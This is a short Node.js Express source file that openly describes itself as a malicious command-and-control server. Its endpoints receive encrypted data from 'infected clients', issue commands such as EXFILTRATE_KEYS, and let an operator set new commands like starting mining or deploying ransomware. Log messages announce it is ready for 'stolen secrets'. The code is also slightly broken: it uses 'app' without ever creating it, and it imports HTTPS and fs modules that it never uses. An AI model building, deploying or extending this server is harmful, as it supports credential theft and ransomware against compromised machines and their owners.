import express from 'express';
import { createServer } from 'https'; // For HTTPS support
import fs from 'fs'; // To read certificate files

// Use Koyeb's dynamic port, or fallback to 8000 locally
const PORT = process.env.PORT || 8000;

// Temporary memory to hold our data and commands
let latestData = [];
let currentCommand = { command: "EXFILTRATE_KEYS", timestamp: new Date() };

// Middleware to parse incoming JSON data
app.use(express.json());

// 1. Home route to confirm server is alive
app.get('/', (req, res) => {
   res.send('🚀 Malicious C2 Server is running — waiting for exfiltration...');
});

// 2. Endpoint to RECEIVE encrypted payloads from infected clients
app.post('/data', (req, res) => {
   const receivedData = req.body;
   console.log("Received Encrypted Data:", receivedData);
   latestData.push({ ...receivedData, receivedAt: new Date() });
   // Forward the data to the C2 hub for processing
   res.status(200).json({ status: "success", message: "Payload ingested" });
});

// 3. Endpoint to FETCH current command for execution
app.get('/commands', (req, res) => {
   res.json(currentCommand);
});

// 4. Endpoint to SET a new command (e.g., start mining, deploy ransomware)
app.get('/set-command', (req, res) => {
   const newCmd = req.query.cmd || "EXFILTRATE_KEYS";
   currentCommand = { command: newCmd, timestamp: new Date() };
   res.send(`Malicious Command Set: ${newCmd}`);
});

// Start the server binding to 0.0.0.0
app.listen(PORT, '0.0.0.0', () => {
   console.log(`C2 Server Active on Port ${PORT} — Ready to receive stolen secrets!`);
});

